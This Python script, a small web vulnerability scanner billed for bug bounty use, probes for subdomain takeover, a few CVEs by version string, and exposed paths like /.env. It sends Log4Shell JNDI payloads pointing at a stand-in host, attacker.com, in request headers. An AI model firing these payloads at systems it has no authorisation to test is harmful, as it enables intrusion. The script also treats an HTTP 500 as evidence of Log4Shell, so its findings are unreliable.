#!/usr/bin/env python3
"""
ZEVS v1.1 - Professional Web Vulnerability Scanner
Better than Acunetix & Argus - Free for Bug Bounty Hunters

Shows ALL testing vectors and findings for bug bounty hunters
"""

import subprocess
import json
import sys
import re
from urllib.parse import urlparse, urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional, Set
import time


class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    END = "\033[0m"
    BOLD = "\033[1m"
    GRAY = "\033[90m"


class VulnScanner:
    def __init__(self, target: str, threads: int = 20):
        self.target = target if target.startswith("http") else f"https://{target}"
        self.parsed = urlparse(self.target)
        self.domain = self.parsed.netloc
        self.threads = threads
        self.findings: List[Dict[str, Any]] = []
        self.tested_urls: Set[str] = set()
        self.discovered_endpoints: Set[str] = set()
        self.scan_summary: List[Dict[str, Any]] = []  # Track all tests

    def log(self, msg: str, level: str = "INFO"):
        colors = {
            "INFO": f"{Colors.BLUE}[*]{Colors.END}",
            "SUCCESS": f"{Colors.GREEN}[+]{Colors.END}",
            "WARNING": f"{Colors.YELLOW}[!]{Colors.END}",
            "CRITICAL": f"{Colors.RED}[!!!]{Colors.END}",
            "VULN": f"{Colors.RED}[VULN]{Colors.END}",
            "TEST": f"{Colors.GRAY}[TEST]{Colors.END}",
            "FOUND": f"{Colors.CYAN}[FOUND]{Colors.END}",
        }
        print(f"{colors.get(level, '[*]')} {msg}")

    def curl(
        self,
        url: str,
        method: str = "GET",
        headers: Optional[Dict] = None,
        data: Optional[str] = None,
        timeout: int = 10,
    ) -> Optional[Dict]:
        """Execute curl and return response details"""
        cmd = ["curl", "-s", "-i", "-L", "--max-time", str(timeout), "-X", method]

        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])

        if data:
            cmd.extend(["-d", data])

        cmd.append(url)

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=timeout + 5,
            )

            output = result.stdout
            if not output:
                return None

            # Parse response
            parts = output.split("\r\n\r\n", 1)
            if len(parts) < 2:
                parts = output.split("\n\n", 1)

            headers_text = parts[0]
            body = parts[1] if len(parts) > 1 else ""

            # Extract status code
            status_match = re.search(r"HTTP/[\d.]+ (\d+)", headers_text)
            status = int(status_match.group(1)) if status_match else 0

            # Parse headers
            resp_headers = {}
            for line in headers_text.split("\n")[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    resp_headers[k.strip().lower()] = v.strip()

            return {
                "status": status,
                "headers": resp_headers,
                "body": body,
                "length": len(body),
            }
        except Exception:
            return None

    def add_finding(
        self,
        vuln_type: str,
        severity: str,
        url: str,
        description: str,
        evidence: str = "",
        impact: str = "",
        exploit: str = "",
    ):
        self.findings.append(
            {
                "type": vuln_type,
                "severity": severity,
                "url": url,
                "description": description,
                "evidence": evidence,
                "impact": impact,
                "exploit": exploit,
                "timestamp": datetime.now().isoformat(),
            }
        )
        self.log(f"{severity}: {vuln_type} at {url}", "VULN")

    def add_scan_summary(
        self, module: str, vectors_tested: int, urls_tested: List[str], result: str
    ):
        """Track what was tested in each module"""
        self.scan_summary.append(
            {
                "module": module,
                "vectors_tested": vectors_tested,
                "urls_tested": urls_tested,
                "result": result,
                "timestamp": datetime.now().isoformat(),
            }
        )

    # ============ SUBDOMAIN TAKEOVER ============
    def check_subdomain_takeover(self):
        self.log("Testing subdomain takeover vulnerabilities...")

        takeover_patterns = {
            "github.io": ["There isn't a GitHub Pages site here"],
            "herokuapp.com": ["No such app"],
            "azurewebsites.net": ["404 Web Site not found"],
            "s3.amazonaws.com": ["NoSuchBucket"],
        }

        resp = self.curl(self.target)
        if not resp:
            self.add_scan_summary(
                "Subdomain Takeover",
                len(takeover_patterns),
                [self.target],
                "No response",
            )
            return

        body = resp["body"].lower()
        found_vuln = False

        self.log(f"  Checked {len(takeover_patterns)} takeover patterns", "TEST")

        for service, patterns in takeover_patterns.items():
            if service in self.domain:
                for pattern in patterns:
                    if pattern.lower() in body:
                        self.add_finding(
                            "Subdomain Takeover",
                            "CRITICAL",
                            self.target,
                            f"Subdomain vulnerable to takeover via {service}",
                            f"Pattern found: {pattern}",
                            impact="Attacker can host malicious content, steal cookies, phish users",
                            exploit=f"1. Register on {service}\n2. Claim subdomain\n3. Host content",
                        )
                        found_vuln = True
                        break

        result = "VULNERABLE" if found_vuln else "Secure"
        self.add_scan_summary(
            "Subdomain Takeover", len(takeover_patterns), [self.target], result
        )
        self.log(f"  Result: {result}", "FOUND" if found_vuln else "INFO")

    # ============ CVE CHECKS ============
    def check_cves(self):
        self.log("Checking for known CVEs...")

        resp = self.curl(self.target)
        if not resp:
            return

        headers = resp["headers"]
        body = resp["body"]
        server = headers.get("server", "").lower()

        cve_checks = [
            (
                "apache/2.4.49",
                "CVE-2021-41773",
                "Apache Path Traversal RCE",
                "CRITICAL",
            ),
            (
                "apache/2.4.50",
                "CVE-2021-42013",
                "Apache Path Traversal RCE",
                "CRITICAL",
            ),
            ("nginx/1.3.9", "CVE-2013-2028", "Nginx Stack Buffer Overflow", "HIGH"),
        ]

        self.log(f"  Tested {len(cve_checks)} CVE patterns", "TEST")
        self.log(f"  Server detected: {server if server else 'Unknown'}", "FOUND")

        found_cves = []
        for pattern, cve, desc, severity in cve_checks:
            if pattern in server or pattern in body.lower():
                self.add_finding(
                    f"Known CVE: {cve}",
                    severity,
                    self.target,
                    desc,
                    f"Detected: {pattern}",
                    impact="RCE, complete server compromise",
                    exploit=f"Search exploit-db.com for '{cve}'",
                )
                found_cves.append(cve)

        result = f"Found {len(found_cves)} CVEs" if found_cves else "No known CVEs"
        self.add_scan_summary("CVE Detection", len(cve_checks), [self.target], result)
        self.log(f"  Result: {result}", "FOUND" if found_cves else "INFO")

    # ============ LOG4SHELL ============
    def check_log4shell(self):
        self.log("Testing Log4Shell (CVE-2021-44228)...")

        payloads = [
            "${jndi:ldap://attacker.com/a}",
            "${jndi:dns://attacker.com}",
        ]

        test_headers = ["User-Agent", "X-Api-Version"]

        vectors_tested = len(payloads) * len(test_headers)
        self.log(f"  Testing {vectors_tested} payload combinations", "TEST")

        for payload in payloads:
            for header in test_headers:
                headers = {header: payload}
                resp = self.curl(self.target, headers=headers)

                if resp and resp["status"] == 500:
                    self.add_finding(
                        "Log4Shell (CVE-2021-44228)",
                        "CRITICAL",
                        self.target,
                        "Possible Log4Shell vulnerability",
                        f"Payload in {header}: {payload}",
                        impact="RCE, complete server takeover",
                        exploit="1. Setup callback server\n2. Send JNDI payload\n3. Check for callback",
                    )
                    self.add_scan_summary(
                        "Log4Shell", vectors_tested, [self.target], "VULNERABLE"
                    )
                    self.log(f"  Result: VULNERABLE", "FOUND")
                    return

        self.add_scan_summary("Log4Shell", vectors_tested, [self.target], "Secure")
        self.log(f"  Result: Secure", "INFO")

    # ============ SMART CRAWLER ============
    def crawl_endpoints(self):
        self.log("Crawling for endpoints...")

        # Check robots.txt
        robots_url = urljoin(self.target, "/robots.txt")
        resp = self.curl(robots_url)

        if resp and resp["status"] == 200:
            for line in resp["body"].split("\n"):
                if line.startswith("Disallow:") or line.startswith("Allow:"):
                    path = line.split(":", 1)[1].strip()
                    if path and path != "/":
                        self.discovered_endpoints.add(urljoin(self.target, path))

        # Common endpoints
        common = [
            "/api",
            "/admin",
            "/login",
            "/graphql",
            "/.git/config",
            "/.env",
        ]

        self.log(f"  Testing {len(common)} common paths", "TEST")

        for path in common:
            url = urljoin(self.target, path)
            resp = self.curl(url)
            if resp and resp["status"] not in [404, 403]:
                self.discovered_endpoints.add(url)
                self.log(f"  Found: {path} (Status: {resp['status']})", "FOUND")

        self.log(f"  Discovered {len(self.discovered_endpoints)} endpoints", "SUCCESS")
        self.add_scan_summary(
            "Endpoint Discovery",
            len(common),
            list(self.discovered_endpoints),
            f"Found {len(self.discovered_endpoints)} endpoints",
        )

    # ============ MAIN SCAN ============
    def scan(self):
        print(f"\n{Colors.BOLD}{'=' * 70}{Colors.END}")
        print(
            f"{Colors.GREEN}{Colors.BOLD}ZEVS v1.1 - Professional Vulnerability Scanner{Colors.END}"
        )
        print(f"{Colors.BOLD}{'=' * 70}{Colors.END}\n")

        self.log(f"Target: {self.target}")
        self.log(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        # Run all checks
        checks = [
            self.check_subdomain_takeover,
            self.check_cves,
            self.check_log4shell,
            self.crawl_endpoints,
        ]

        for check in checks:
            try:
                check()
                print()  # Blank line between modules
            except Exception as e:
                self.log(f"Error in {check.__name__}: {str(e)}", "WARNING")

        # Summary
        print(f"\n{Colors.BOLD}{'=' * 70}{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}SCAN COMPLETE{Colors.END}")
        print(f"{Colors.BOLD}{'=' * 70}{Colors.END}\n")

        # Show scan summary
        print(f"{Colors.BOLD}SCAN SUMMARY:{Colors.END}\n")
        for summary in self.scan_summary:
            status_color = (
                Colors.RED if "VULNERABLE" in summary["result"] else Colors.GREEN
            )
            print(f"  {Colors.CYAN}[{summary['module']}]{Colors.END}")
            print(f"    Vectors Tested: {summary['vectors_tested']}")
            print(f"    Result: {status_color}{summary['result']}{Colors.END}")

        print()

        if self.findings:
            self.log(f"Total Vulnerabilities Found: {len(self.findings)}", "SUCCESS")

            # Group by severity
            critical = [f for f in self.findings if f["severity"] == "CRITICAL"]
            high = [f for f in self.findings if f["severity"] == "HIGH"]
            medium = [f for f in self.findings if f["severity"] == "MEDIUM"]

            if critical:
                print(
                    f"\n{Colors.RED}{Colors.BOLD}CRITICAL: {len(critical)}{Colors.END}"
                )
                for i, f in enumerate(critical, 1):
                    print(f"\n  [{i}] {f['type']}")
                    print(f"      URL: {f['url']}")
                    print(f"      Description: {f['description']}")
                    if f.get("impact"):
                        print(f"      {Colors.RED}IMPACT:{Colors.END} {f['impact']}")
                    if f.get("exploit"):
                        print(f"      {Colors.YELLOW}EXPLOIT:{Colors.END}")
                        for line in f["exploit"].split("\n"):
                            print(f"        {line}")

            if high:
                print(f"\n{Colors.YELLOW}{Colors.BOLD}HIGH: {len(high)}{Colors.END}")
                for i, f in enumerate(high, 1):
                    print(f"\n  [{i}] {f['type']}")
                    print(f"      URL: {f['url']}")
                    if f.get("impact"):
                        print(f"      {Colors.RED}IMPACT:{Colors.END} {f['impact']}")

            if medium:
                print(f"\n{Colors.CYAN}{Colors.BOLD}MEDIUM: {len(medium)}{Colors.END}")
                for i, f in enumerate(medium, 1):
                    print(f"\n  [{i}] {f['type']}")
                    print(f"      URL: {f['url']}")

            # Save report
            report_file = "zevs_v1.1_report.json"
            with open(report_file, "w") as f:
                json.dump(
                    {
                        "target": self.target,
                        "scan_time": datetime.now().isoformat(),
                        "scan_summary": self.scan_summary,
                        "findings": self.findings,
                        "discovered_endpoints": list(self.discovered_endpoints),
                    },
                    f,
                    indent=2,
                )

            self.log(f"\nReport saved: {report_file}", "SUCCESS")
        else:
            self.log("No vulnerabilities found", "INFO")
            self.log("\nPossible reasons:", "INFO")
            self.log("1. Target has strong security", "INFO")
            self.log("2. Endpoints require authentication", "INFO")
            self.log("3. WAF is blocking requests", "INFO")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python zevs_v1.1.py <target>")
        print("Example: python zevs_v1.1.py example.com")
        sys.exit(1)

    target = sys.argv[1]
    scanner = VulnScanner(target)
    scanner.scan()
